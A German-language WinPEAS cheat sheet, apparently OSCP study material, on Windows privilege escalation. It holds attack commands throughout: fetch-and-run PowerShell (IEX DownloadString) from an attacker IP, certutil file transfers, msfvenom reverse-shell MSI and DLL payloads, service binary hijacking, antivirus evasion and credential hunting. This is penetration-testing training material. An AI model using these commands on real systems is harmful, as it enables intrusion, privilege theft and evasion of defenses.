# WinPEAS - Windows Privilege Escalation Awesome Scripts

## Was ist WinPEAS?

WinPEAS ist ein umfassendes Post-Exploitation Tool für Windows Privilege Escalation. Es scannt automatisch nach hunderten von Privilege Escalation Vectors.

**Teil der PEASS-ng Suite:**
- WinPEAS - Windows
- LinPEAS - Linux
- MacPEAS - macOS

---

## Download & Installation

### Releases
```bash
# GitHub Releases
https://github.com/carlospolop/PEASS-ng/releases/latest

# Dateien:
# winPEASx64.exe      - 64-bit executable
# winPEASx86.exe      - 32-bit executable
# winPEAS.bat         - Batch script version
# winPEAS.ps1         - PowerShell version
```

### Auf Kali vorbereiten
```bash
# Download
cd /opt
git clone https://github.com/carlospolop/PEASS-ng
cd PEASS-ng/winPEAS/winPEASexe/binaries

# Oder direkt wget
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
```

---

## File-Transfer zum Target

### Via HTTP
```bash
# Kali: Python HTTP Server
python3 -m http.server 80

# Windows PowerShell
certutil -urlcache -f http://10.10.14.5/winPEASx64.exe winpeas.exe
# Oder
Invoke-WebRequest -Uri http://10.10.14.5/winPEASx64.exe -OutFile winpeas.exe
# Oder
wget http://10.10.14.5/winPEASx64.exe -O winpeas.exe
# Oder
iwr http://10.10.14.5/winPEASx64.exe -OutFile winpeas.exe
```

### Via SMB
```bash
# Kali: SMB Server
impacket-smbserver share /opt/tools -smb2support

# Windows
copy \\10.10.14.5\share\winPEASx64.exe C:\Temp\winpeas.exe
```

### Via evil-winrm
```bash
# In evil-winrm Session
upload /opt/tools/winPEASx64.exe
```

### Base64 Transfer (wenn alles andere blockt)
```bash
# Kali: Encode
base64 -w 0 winPEASx64.exe > winpeas.b64

# Windows: Decode
certutil -decode winpeas.b64 winpeas.exe
```

---

## Basis-Verwendung

### Standard Run
```cmd
# Einfach ausführen
winPEASx64.exe

# Mit CMD (falls Permission-Probleme)
cmd /c winPEASx64.exe
```

### Output in Datei
```cmd
# Output umleiten
winPEASx64.exe > output.txt

# Alle Ausgaben (inkl. Errors)
winPEASx64.exe > output.txt 2>&1

# In temp Directory
cd C:\Windows\Temp
winPEASx64.exe > wp.txt
```

---

## Wichtige Parameter

### Schnell-Scan (fast)
```cmd
# Nur die wichtigsten Checks
winPEASx64.exe fast

# Empfohlen für erste schnelle Übersicht
```

### Langsamer Scan (all)
```cmd
# Alle Checks (kann Minuten dauern)
winPEASx64.exe

# Oder explizit
winPEASx64.exe all
```

### Output-Optionen
```cmd
# Keine Farben (besser für Files)
winPEASx64.exe notcolor

# Quiet Mode (weniger Output)
winPEASx64.exe quiet

# Kombiniert
winPEASx64.exe quiet notcolor > output.txt
```

### Spezifische Checks
```cmd
# Nur System Info
winPEASx64.exe systeminfo

# Nur User Info
winPEASx64.exe userinfo

# Nur Process Info
winPEASx64.exe processinfo

# Nur Services
winPEASx64.exe servicesinfo

# Nur Applications
winPEASx64.exe applicationsinfo

# Nur Network Info
winPEASx64.exe networkinfo

# Nur File/Folder Permissions
winPEASx64.exe filesinfo
```

### Debug & Verbose
```cmd
# Debug Mode
winPEASx64.exe debug

# Full Output (sehr ausführlich)
winPEASx64.exe full
```

---

## Output verstehen

### Farbcodes

```
GRÜN    = Nichts gefunden
GELB    = Potentiell interessant
ROT     = Privilege Escalation Möglichkeit!
```

### Wichtigste Sections

#### 1. System Information
```
- OS Version (alte/ungepatchte Systeme?)
- Architecture (x86/x64)
- Hostname
- Domain (Workgroup/Domain)
- Antivirus (EDR/AV aktiv?)
```

#### 2. Users Information
```
- Current User & Privileges
- All Users
- Logged Users
- RDP Sessions
- Autologon Credentials (!)
```

#### 3. Processes & Services
```
- Unquoted Service Paths (!)
- Services mit schwachen Permissions (!)
- Hijackable DLLs
- Running Processes
```

#### 4. Installed Applications
```
- Installed Software
- Running Software
- AlwaysInstallElevated (!)
```

#### 5. Network Information
```
- Network Interfaces
- Network Shares
- Hosts File
- Firewall Rules
```

#### 6. Credentials
```
- SAM/SYSTEM Backups (!)
- Unattended Install Files (!)
- Stored Credentials
- Registry Credentials
- PowerShell History
```

---

## Wichtigste Privilege Escalation Vectors

### 1. Unquoted Service Paths
```
🔴 [!] Unquoted Service Path: C:\Program Files\My App\service.exe
→ Wenn Pfad Spaces hat und nicht quoted
→ Exploit: Erstelle C:\Program.exe

# Exploit
echo "payload" > "C:\Program.exe"
sc stop VulnService
sc start VulnService
```

### 2. Weak Service Permissions
```
🔴 [!] Service 'VulnService' has weak file permissions
→ User kann Service Binary überschreiben

# Exploit
# 1. Backup
move C:\Path\service.exe C:\Path\service.exe.bak
# 2. Replace mit Payload
copy C:\Temp\reverse.exe C:\Path\service.exe
# 3. Restart
sc stop VulnService
sc start VulnService
```

### 3. AlwaysInstallElevated
```
🔴 [!] AlwaysInstallElevated enabled!
→ MSI Packages werden als SYSTEM installiert

# Check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi > shell.msi
msiexec /quiet /qn /i C:\Temp\shell.msi
```

### 4. Autologon Credentials
```
🔴 [!] Autologon credentials found!
DefaultUserName: administrator
DefaultPassword: P@ssw0rd123!

→ Direkt verwendbar für Login/PSExec/WinRM
```

### 5. Saved Credentials (cmdkey)
```
🔴 [!] Saved credentials found
Target: Domain:target=SERVER01

# Exploit
runas /savecred /user:DOMAIN\admin cmd.exe
```

### 6. DLL Hijacking
```
🔴 [!] Hijackable DLL Path: C:\Program Files\App\missing.dll
→ Application lädt DLL von schreibbarem Pfad

# Exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll > missing.dll
move missing.dll "C:\Program Files\App\"
# Restart Application/Service
```

### 7. Registry Autologon
```
🔴 [!] Registry Autologon credentials
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
DefaultUserName: admin
DefaultPassword: SecretPass!
```

### 8. Unattended Install Files
```
🔴 [!] Unattended install file found
C:\Windows\Panther\Unattend.xml
→ Kann Passwörter im Klartext enthalten

# Prüfen
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
```

### 9. Token Impersonation (SeImpersonatePrivilege)
```
🔴 [!] SeImpersonatePrivilege enabled
→ JuicyPotato, RoguePotato, PrintSpoofer

# Check
whoami /priv

# Exploit (PrintSpoofer.exe)
PrintSpoofer.exe -i -c cmd
```

### 10. Scheduled Tasks
```
🔴 [!] Scheduled Task 'Backup' runs with High Privileges
TaskToRun: C:\Scripts\backup.bat
→ Überschreibbar

# Exploit
echo "C:\Temp\reverse.exe" > C:\Scripts\backup.bat
```

---

## Post-WinPEAS Exploitation Workflow

### 1. Analyse Output
```cmd
# Nach wichtigen Keywords grep pen
type output.txt | findstr /i "password"
type output.txt | findstr /i "privilege"
type output.txt | findstr /i "unquoted"
type output.txt | findstr /i "hijackable"
```

### 2. Priorisieren
```
1. Stored Credentials → Direkt verwendbar
2. AlwaysInstallElevated → Einfach, zuverlässig
3. Unquoted Service Path → Schnell
4. Token Privileges (SeImpersonate) → JuicyPotato
5. DLL Hijacking → Komplexer
```

### 3. Exploit
```
Abhängig von gefundenem Vector
→ Siehe einzelne Exploits oben
```

---

## WinPEAS Alternativen/Ergänzungen

### PowerUp.ps1
```powershell
# PowerSploit Module
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1')
Invoke-AllChecks
```

### PrivescCheck.ps1
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PrivescCheck.ps1')
Invoke-PrivescCheck -Extended
```

### Seatbelt.exe
```cmd
# .NET Assembly für tiefere Enumeration
Seatbelt.exe -group=all
```

### JAWS (PowerShell)
```powershell
# Just Another Windows Enum Script
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/jaws-enum.ps1')
```

---

## OPSEC Considerations

### WinPEAS ist LAUT!
```
- Queries Registry
- Enumerates Services
- Reads Files
- Checks Permissions
- Wird von AV oft erkannt!
```

### Leiser machen
```cmd
# Nur schnelle Checks
winPEASx64.exe fast quiet

# Nur spezifische Checks
winPEASx64.exe servicesinfo quiet
```

### AV Umgehen
```cmd
# WinPEAS.bat statt .exe (weniger Detection)
winPEAS.bat

# PowerShell-Version (in-memory)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')

# Obfuscation
# Nutze Tools wie Invoke-Obfuscation
```

---

## Praktische OSCP-Workflows

### Workflow 1: Standard Privesc Enum
```cmd
# 1. Upload
certutil -urlcache -f http://10.10.14.5/winPEASx64.exe wp.exe

# 2. Run
cd C:\Windows\Temp
wp.exe > out.txt 2>&1

# 3. Download Output (via SMB/HTTP/etc)
# Evil-WinRM:
download out.txt

# 4. Auf Kali analysieren
cat out.txt | grep -i "password"
cat out.txt | grep -E "\[!\]"  # Nur Findings
```

### Workflow 2: Fast Enum (wenn Zeit limitiert)
```cmd
# Schnell scannen
winPEASx64.exe fast notcolor > fast.txt

# Wichtigste Findings ansehen
type fast.txt | findstr /i "unquoted"
type fast.txt | findstr /i "alwaysinstall"
type fast.txt | findstr /i "autologon"
```

### Workflow 3: PowerShell In-Memory
```powershell
# Kali: Host winPEAS.ps1
python3 -m http.server 80

# Windows: Load & Execute
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')
Invoke-winPEAS
```

---

## Tipps & Tricks

### 1. Output zu groß
```cmd
# Nur Findings (Warnings/Errors)
winPEASx64.exe | findstr /i "\[!\]"

# Oder quiet mode
winPEASx64.exe quiet
```

### 2. No Write-Permissions
```cmd
# Output nach readable location
cd C:\Windows\Temp
winPEASx64.exe > out.txt

# Oder Temp des Users
cd %TEMP%
winPEASx64.exe > out.txt
```

### 3. AV blockt .exe
```cmd
# Batch-Version nutzen
winPEAS.bat > out.txt

# Oder PowerShell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/winPEAS.ps1')"
```

### 4. Schnelle Manual Checks (ohne WinPEAS)
```cmd
# Whoami
whoami /all

# System Info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Patch Level
wmic qfe list

# Users
net user
net localgroup administrators

# Services
sc query state=all

# Scheduled Tasks
schtasks /query /fo LIST /v

# Processes
tasklist /v

# Network
netstat -ano

# Firewall
netsh advfirewall show allprofiles
```

---

## Quick Reference

### Commands
```cmd
# Standard
winPEASx64.exe

# Fast
winPEASx64.exe fast

# Output to File
winPEASx64.exe > output.txt 2>&1

# No Colors
winPEASx64.exe notcolor

# Quiet
winPEASx64.exe quiet

# Specific Module
winPEASx64.exe servicesinfo
```

### Download
```powershell
# certutil
certutil -urlcache -f http://IP/winPEASx64.exe wp.exe

# PowerShell
Invoke-WebRequest http://IP/winPEASx64.exe -OutFile wp.exe

# wget (Alias)
wget http://IP/winPEASx64.exe -O wp.exe
```

### High-Value Findings
```
🔴 Unquoted Service Path
🔴 Weak Service Permissions
🔴 AlwaysInstallElevated
🔴 Autologon Credentials
🔴 Saved Credentials (cmdkey)
🔴 SeImpersonatePrivilege
🔴 Unattended Install Files
🔴 Hijackable DLLs
```

---

## Wichtig für OSCP

1. **Upload-Methode vorbereiten** - certutil, HTTP, SMB, Base64
2. **Output in File** - Immer > output.txt für Analyse
3. **Fast Mode** - Für schnelle Übersicht
4. **Red Flags** - `[!]` = Exploit möglich
5. **Manual Follow-up** - WinPEAS zeigt Weg, nicht die Exploitation
6. **Kombinieren** - Mit PowerUp, Seatbelt für vollständige Coverage
7. **AV Bypass** - .bat oder .ps1 wenn .exe geblockt
8. **Credentials** - IMMER nach Passwörtern suchen in Output

---

## Resources

- GitHub: https://github.com/carlospolop/PEASS-ng
- HackTricks: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
